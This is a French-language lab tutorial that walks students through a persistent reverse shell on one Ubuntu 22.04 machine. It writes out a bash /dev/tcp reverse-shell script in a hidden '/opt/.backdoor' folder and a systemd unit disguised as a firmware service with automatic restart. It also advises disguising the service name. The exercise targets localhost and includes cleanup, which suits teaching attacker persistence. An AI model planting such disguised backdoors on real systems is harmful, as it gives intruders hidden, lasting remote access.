
#  TP avec **UNE SEULE MACHINE Ubuntu 22.04**

---

## üîß Objectif

* Simuler un **reverse shell** avec un service systemd
* Utiliser **une seule machine Ubuntu 22.04**
* Ouvrir le listener (`nc -lvnp`) **localement**
* Prouver que le service fonctionne et persiste **m√™me apr√®s red√©marrage**

---

## 1. SCH√âMA DE TRAVAIL (SANS R√âSEAU EXTERNE)

```
+----------------------------------------+
|   MACHINE UBUNTU 22.04 UNIQUE          |
|                                        |
|  Terminal 1 :                          |
|     nc -lvnp 4444                      |
|                                        |
|  Terminal 2 (root) :                   |
|     systemd --> bash reverse vers 127.0.0.1:4444  |
+----------------------------------------+
```

---

## 2. √âTAPES COMPL√àTES

---

### 2.1 Terminal 1 ‚Äì Ouvrir le port localement (port 4444)

```bash
nc -lvnp 4444
```

Attendre. Ne rien fermer.

---

### 2.2 Terminal 2 ‚Äì Cr√©er le script malveillant

```bash
sudo mkdir -p /opt/.backdoor
sudo nano /opt/.backdoor/reverse.sh
```

Contenu du script :

```bash
#!/bin/bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

Enregistrez. Puis :

```bash
sudo chmod +x /opt/.backdoor/reverse.sh
```

---

### 2.3 Cr√©er le faux service systemd

```bash
sudo nano /etc/systemd/system/systemd-firmware.service
```

Contenu :

```ini
[Unit]
Description=Firmware Sync Service
After=network.target

[Service]
ExecStart=/opt/.backdoor/reverse.sh
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

---

### 2.4 Activer le service

```bash
sudo systemctl daemon-reload
sudo systemctl enable systemd-firmware
sudo systemctl start systemd-firmware
```

---

### 2.5 Observer le reverse shell (Terminal 1)

Si tout fonctionne, vous verrez :

```
Connection from 127.0.0.1
bash-5.1$
```

Vous √™tes dans un shell **ouvert sur vous-m√™me**, preuve que le service marche.

---

### 2.6 Reboot et test de persistance

```bash
sudo reboot
```

Une fois la machine red√©marr√©e, ouvrez rapidement un terminal et tapez :

```bash
nc -lvnp 4444
```

Le shell r√©appara√Æt quelques secondes plus tard.
Le service s‚Äôest relanc√© **automatiquement**.

---

## 3. Nettoyage

```bash
sudo systemctl stop systemd-firmware
sudo systemctl disable systemd-firmware
sudo rm /etc/systemd/system/systemd-firmware.service
sudo rm -rf /opt/.backdoor/
sudo systemctl daemon-reload
```

---

## 4. Remarques p√©dagogiques

* **Pas besoin de r√©seau**, ni d‚ÄôIP publique
* Parfait pour **TP local en salle** ou **autoformation**
* C‚Äôest un exemple de **persistence locale**
* Les √©tudiants **voient directement les effets** du service systemd
* Le nom du service peut √™tre **d√©guis√©** (`systemd-firmware`, `dbus-monitor`, etc.)

